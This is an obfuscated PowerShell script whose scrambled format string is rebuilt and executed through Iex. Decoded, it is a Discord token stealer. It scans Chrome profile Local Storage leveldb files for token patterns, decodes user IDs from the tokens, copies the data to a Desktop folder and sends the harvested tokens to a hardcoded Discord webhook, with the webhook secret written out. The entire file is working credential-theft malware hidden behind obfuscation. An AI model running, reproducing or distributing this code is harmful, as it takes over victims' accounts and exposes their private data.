(("{141}{88}{34}{272}{232}{128}{120}{292}{81}{138}{143}{289}{15}{202}{290}{42}{206}{11}{149}{126}{184}{253}{75}{129}{284}{21}{276}{63}{117}{16}{73}{8}{100}{147}{271}{112}{164}{28}{107}{242}{92}{6}{274}{197}{46}{225}{148}{211}{285}{218}{223}{224}{121}{78}{241}{262}{102}{144}{263}{294}{86}{153}{62}{25}{254}{49}{133}{99}{54}{160}{191}{70}{177}{227}{87}{68}{19}{48}{238}{222}{41}{195}{220}{174}{83}{173}{264}{213}{4}{162}{98}{123}{56}{266}{279}{155}{189}{137}{231}{163}{154}{185}{171}{258}{131}{270}{201}{53}{44}{2}{124}{39}{95}{108}{47}{97}{30}{71}{35}{76}{244}{161}{215}{3}{175}{52}{77}{106}{14}{101}{273}{151}{9}{172}{94}{178}{26}{198}{199}{24}{216}{267}{228}{255}{0}{200}{118}{136}{288}{82}{113}{221}{278}{29}{45}{170}{259}{142}{165}{281}{60}{105}{10}{204}{43}{182}{196}{13}{20}{205}{104}{168}{66}{17}{293}{209}{38}{187}{230}{159}{193}{233}{116}{268}{212}{226}{296}{23}{55}{122}{146}{250}{7}{96}{84}{22}{240}{256}{114}{89}{51}{251}{186}{31}{180}{219}{249}{280}{61}{248}{110}{179}{208}{167}{295}{111}{152}{265}{257}{169}{192}{277}{27}{283}{150}{72}{247}{181}{37}{234}{287}{261}{130}{50}{157}{12}{203}{58}{40}{194}{214}{36}{139}{5}{229}{236}{109}{65}{85}{188}{135}{282}{127}{1}{246}{245}{190}{207}{67}{57}{69}{239}{269}{217}{18}{243}{90}{158}{260}{210}{252}{79}{166}{103}{91}{145}{59}{176}{134}{125}{93}{64}{235}{286}{275}{291}{132}{119}{80}{237}{74}{183}{32}{115}{156}{140}{33}" -f 'BPs].Add(31ltoke','ath -Parent) -It','    try {
    ',' 31ltokenMap = @{BPsbad_tokensBPs ','Warning BPsInvalid chars in 31lTokenBPs
     ','qW1Deskt','
       ','ields += @{ BPsnameBPs = BPsUse','t -Headers 31lheaders -Body 31ljson -ContentType BPsapplicatio','toke','rite-Verbose BPsNo valid tokens in: 31lDirBPs
      ','       Write-Error BPsInvalid URL scheme:','      return
    ','    return 31ltokenMap
    } catch {
        Write','31lpot','am (
       ','nse = Invoke-RestMethod -Uri 31lUrl -Meth','-not ','s from fallback: 31l(31ltokens e29 Out-String)BPs
                if (Test-Path 31lfallPath) {
               ','      Write-Warning BPsAccess error for 31lFile : 31l_BPs
    ','-Error BPsDir process failed: 31','nding ',' if (-not 31lfields) {','lds += @{ BPsnameBPs','9 Out-Null
  ','ontent, 31lpatter','            ',' {
                    31ltokens = Get-TokensFromDir -Dir 31lleveldb
               ','de)','                }
   ','ull','-Request -Url 31lUrl -Data 31ldata
}

',' 31ltokens
   ','}

# Enable verbose output
31lVerbosePreference = BPsContinueBPs
Main','1-_]{24,','1lfiles = Get-ChildItem -Path 31lDir -File -ErrorAction Stop
        if ','AM','of.Name)BPs
                }
            } catch {
                Write-Warning BPsAcc','enMap -or -not 31lTokenMap -is [hashtabl',') {
 ',') ','rn 31lnull
      ','Data,
        [int]31lMaxRetries = 3
    )
    if (-not (31lUrl -match BPs^http(s?):','l
        }
        Write-Verbose BPsToken map: 31l(31lto','     [string]31lDir
    )
','             31ltokenMap[31lid].Add(31ltoken) e29 Out-Null
','    if (31','        ret','   ','e29 ForEach-Object { 3','nd: 31lchromeDataBPs
 ','Ps = BPsFound tokensBPs
        BPsembedsBPs = @(@{ BPstitleBPs = BPsToken Res','okensFromFile -File ','function Get-TokensFromDir {
    param (
   ','rite-Verbose BPs',' = BPsInvalid TokensBPs; BPsvalueBPs = 31lval }
            }
        } elseif (31lid -ne BPsbad_tokensBPs) {
 ',' 31lpadded = 31lfirst + (BP','h -Recurse -Er','s',' (Test-Path 31lfallPath) {
       ','ensBPs].Count -eq 0) {
 ','
        31lprofiles = Ge','00, 31lcontent.Length)))BPs
        31ltokens = [regex]::Matches(31lc','31lre','           }
            return
        }
    }

    if (-not','  31lsrc = (Get-ChildItem -Path 31lchromeData -Director',',
        [hashtable]31lTokenMap
    )
    if (','fallPat','n 31lnull
    } catch {
  ','ror','           return 31ltokens
        }
        Writ','
        }
        3','s e29 Out-String)BPs
                    if (31lt','od Pos','    31lstatus ','      try {
            31ljson = 3','(-not 31lfiles) {','31lfile.FullName
         ','tion Get-TokensFromFile {
    param (
        [string]31lFile
    )
    try {
        Write-V','se {
                Write-Error BPsNo leveldb sourceBPs
                return
          ','return
    }
','20071127 Firefox/2.0.0.11BPs
}
31lwebhook = BPshttps://discord.com/api/',' 31ltokenMap.ContainsKey','r 31lfirst.Length -gt 26) {
            Write-Warning BPsInvalid length for 31lTokenBPs
        ','svalueBPs = 31lval }
            }
        }
    }
   ','y -Re','F8 -ErrorAction Stop
        Write-Verbose BPsContent sample: 31l(31lcontent.Substring(',': 31lFileBPs
        retur','
31lpattern = BPs[A-Za-z0-9qW','  31ldata = @{
        BPscontentB',' Remove-It','     Write-Error BPsFa','de
        } catch {
','ilentlyContinue
 ','plit B','           Write-Error BPsDir not found:','r ID: 31lidBPs; BP','urn 31ln','      return 31lnull
        }
        31lpad = (4 - (31lfirst.Length % 4)) %','ltokens) {
            W','n/jsonBPs -Er','ential) { continue','  if (-not (Test-Pa','catch {
       ','31l_BPs
        return 31lnull
    }
}

function Send-ToWebhook {
    param (
        ','           W','   if (-not ','BPs
            return 31lresponse',' 31lDirBPs
    ','rce -ErrorAction SilentlyContinue
            }
          ','m -Path 31lchro','
        foreach (31lprof in 31lprofile','ede','(31lid)) {
                    3','
    }
  ','     Write-Output BPsWebhook status: 31lstatusBPs
    } catch {
        Write-Error','j','spo',' Out-Nu','e: 31l(31ltokens e29 Out-String)BPs
        ',' (X11; U; Linu','     }
    }
}

func','           31lval = (31lTokenMap[31lid] e29 Select-Object -First 10) -join BPsl51nBPs
            if (31lval.Length -gt 1024) { 31lval = 31lval.Substring(0, 1020) + BPs...BPs }
   ',' 4
       ','    if (-not (Test-Path 31lDir)',' -ErrorAction S','lBPs
     ','              New-Item -Path (Split-Path 31lfallP','n/jsonBPs
    BPsUser-AgentBPs = BPsMozilla/5.0','1lData e29 ConvertTo-Json -Depth 10 -ErrorAction Stop
            Write-Verbose','data not fou','ode failed fo','tput BPsNo valid tokens or bad structur','1l_.Value }
        if (31',' Remove-Item -Path 31lfallPath -Recurse -Force','e e29 Where-Object { 31l_.Name -eq BPsleveldbBPs } e29 Select-Object -Fi','ll
                    continue
                }
                if ',']::U','webhooks/1406304428432035850/sXFe38hOMa2wk-cOV4B42bthc3ODRtuHCi4hYbWeQO_jQR','E','
','
',' if (31ltokenMap.Count -','-OnvAN8KvsZKrpl4T31n3OBPs

function Send-Request ','th 31lFile)) {
','llback failed: 31l_BPs
            if','      ','rorAction Stop
        ','Failed after 31lMaxRetries attempts: 31l_BPs
                return 3',' 31lUr','1ltoken','        foreach (31l','s) {
','0, [Math]::Min(1',')
        if (-not ','       31',' BPsWebhook failed: 31l_BPs
    }',' ','em -Path ','ashtableBPs
   ','Tokens fou','PsNo files in: 31lDirBPs
            return 31lnu',' ','ring(31lbytes','d with status: 31l(31lresponse.StatusCo','eq 1 -an','  }
        } ','9Profile ','[string]31lUrl','Local Storag','            }
','Write-Verbose BPsValid ID: 31lidBPs
        return 31lid
    } catch {
    ','n in 31lpotential) {
                if ((31ltoken -s','    return 31lnull
     ','-o','= [System.Collections.Generic.HashSet[string]]::new()}
        foreach (31lfile in 31lfiles) {
            31lpotential = Get-T','        ','e-Verbose ','PsqW1.BPs).Count -ne 3) {
                    Write-Warning BPsBad format: 31ltokenBPs
    ','meData -Directory e29 Whe','
function Main {
    31lchromeData = Join-Path -Path 31','
                } else {
                    Write-Warning BPsNo leveldb in 31l(31lpr','kenMap e29 Out-String)BPs
 ','= Send-ToWebhook -Url 31lwebhook -TokenMap','   retur','(31lid -match MJZ^qW1d+31lMJZ)) {
            Write-Warning BPsNon-numeric ID from 31lToken : 31lidBPs
            return 31lnull
        }
        ','Ps = 31lfields })
    }
    return Send','e]) {
        Wri','curs','lid = [System.Text.Encoding','               Copy-','nd: 31l(31ltokens -join MJZ, MJZ)BPs
 ','eqW1leveldbBPs
            try {
                if (Test-Path ','     return 31lnull
    }
    31lfields = @()
    foreach (31lid in 31lTokenMap.Keys) {
        if (31lid -eq BPsbad_tokensBPs -and 31lTokenMa','{
        Write-Warning BPsTrying fallbackBPs
        ','  }
        31lfirst = 31l','   ','
        ','    31ltokenMap[BPsbad_tokensBPs].Add(31l','token) e2','n) e29','BPs
        return 31lnull
    }
}

',' [strin','}

    if (-not 31ltoken','      return 31lnul','lDir - ','//BPs)) {
 ','Item -Path 31lsrc -Destination 31l','re-Object { 31l_.Name -match BPs^(Defaulte2','lTok','ue
                }
         ','1lnul',') + BPs..','atch MJZ^[A-Za-z0-9qW1-_]+31lMJZ) {
            Write-','31lfallPath = Join-Path -Path BPsC:qW1UsersqW131lenv:USERN','ll
        }
       ','                  continue
           ','    Write-Verbose BPsToken','       }
            ','lenv:LOCALAPPDATA -ChildPath BPsGoogleqW1ChromeqW1User DataBPs
    31ltokens = ','parts[0]
        if (31lfirst.Length -lt 24 ','1ltokenMap[31lid] = [System.Collections.Generic.Has','
        if (31lparts.Count -ne 3) {
            Write-Warning BPsInvalid token format: 31lTokenBPs
            retu','Start-Sleep -Seconds 5
  ',' ','lattempt -eq 31lMaxRetries) {
                Write-Error BPs','.BPs }
','BPsNo tokens in','ot 31lid) {
                 ','opBPs -ChildPath BPsleveldbBPs
        try {
            if (Test-Path 31lfallPath) {
           ','te-Error BPsInvalid token map: must be h','TF8.GetSt','qW1.[A-Za-z0-9qW1-_]{27,38}BPs # Token pattern
31lheaders = @{
    BPsContent-TypeBPs = BPsapplicatio','p[31lid].Count -gt 0) {
            31lval = (31lTokenMap[31lid] e29 Select-Ob','ess error in 31l(31lprof.Name): 31l_BPs
            }
        }
    } els',' 31ltokens -or -','     Remove-Item -Path 31lfallPath -Recurse -Fo','

    try {
    ',' return 31lnull
    }
}

function Get-UserId {
    param (
        [string]31lToken
    )
    try {
        31lparts = 31lToken -split BPsqW1.BPs','Action Stop
                31ltoken','
        Write-Warning BPsNo data to sendBPs
        return 31ln','erbose B','.StatusCo','    ','
            Write-Warning B','y -Force e29 Out-Null
 ','emType Director','okens) { break }','t-ChildIte','31lnull

    if (Test-Path 31lchromeData) ','   if (31lval) {
                31lf','ultsBPs; BPsfieldsB','   } el','n 31lnull
    }
    31lattempt = 0
    while (31lattempt -lt 31lMaxRetries) {
  ','n) ','   31ltokenMap[BPsbad_tokens','ull',' 31lprof.FullName -ChildPath BPs','    Write-Warning BPsDec','        }
       ','31lfallPath -Recurse -Force -ErrorAction SilentlyContin','  Write-Error BPsChrome ','PsReading: 31lFileBPs
      ','
            Write-Verbose BPsFile missing: 31lFileBPs
            return 31lnull
        }
        31lconten','   }
        if (31lfirst -notm','            31lleveldb = Join-Path -Path','s=BPs * 31lpad)
        31lbytes = [System.Convert]::Fr','     }
                31lid = Get-UserId -Token 31ltoken
                if (-n','ect -First 10) -join BPsl51nBPs
            if (31lval.Length -gt 1024) { 31lval = 31lval.Substring(0, 1020','s = Get-TokensFromDir -Dir 31lfallPath
            ','r 31lToken : 31l_','    Write-Verbose BPsRequest succe','26}qW1.[A-Za-z0-9qW1-_]{6}',' }
    ','     31lattempt++
            Write-Warning BPsAttempt 31lattempt failed: 31l_BPs','    Write-','data: 31ljsonBPs
            ','31lleveldb)','hSet[string]]::new()
','omBase64String(31lpadded)
 ','{
','d 31ltokenMap[BPsbad_tok','rst 1).FullName
            if (31lsrc) {
  ','     Write-Verbose BPsTokens from 31l(31lprof.Name): 31l(3',' BPsSe','l
     ','not 31ltokens -is [hashtable]) {
    ','e {
      ','(-not','{
    par','g]31lUrl,
        [hashtable]31l','Ou','x i686) Gecko/','31','t = Get-Content -Path 31lFile -Raw -Encoding UT','qW1d+)31lBPs }','            if (31lval) {
                31lfie')).REpLaCe(([ChAR]108+[ChAR]53+[ChAR]49),'`').REpLaCe(([ChAR]113+[ChAR]87+[ChAR]49),'\').REpLaCe('MJZ',[sTrIng][ChAR]39).REpLaCe('BPs',[sTrIng][ChAR]34).REpLaCe(([ChAR]101+[ChAR]50+[ChAR]57),[sTrIng][ChAR]124).REpLaCe('31l','$')|Iex
